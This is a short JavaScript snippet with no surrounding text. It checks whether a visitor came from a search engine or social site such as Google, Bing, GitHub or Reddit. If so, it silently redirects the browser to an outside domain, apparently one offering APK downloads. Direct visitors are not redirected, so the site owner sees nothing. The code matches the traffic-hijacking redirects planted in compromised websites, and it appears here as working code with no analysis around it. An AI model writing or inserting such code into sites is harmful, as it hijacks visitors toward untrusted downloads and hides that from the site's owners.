(function () {
  var referrer = document.referrer.toLowerCase();
  var searchEngines = [
    'google.', 'bing.', 'yahoo.', 'baidu.', 'duckduckgo.', 'yandex.', 'ask.', 'aol.', 'naver.', 'seznam.', 'sogou.', '360.cn', 'so.com',
    'ecosia.org', 'startpage.com', 'qwant.com', 'github.com', 'linkedin.com', 'facebook.com', 'twitter.com', 'reddit.com'
  ];

  var isFromSearchEngine = searchEngines.some(function (engine) {
    return referrer.includes(engine);
  });

  if (isFromSearchEngine) {
    window.location.href = 'https://apk009.tkvip786.com/';
  }
})();
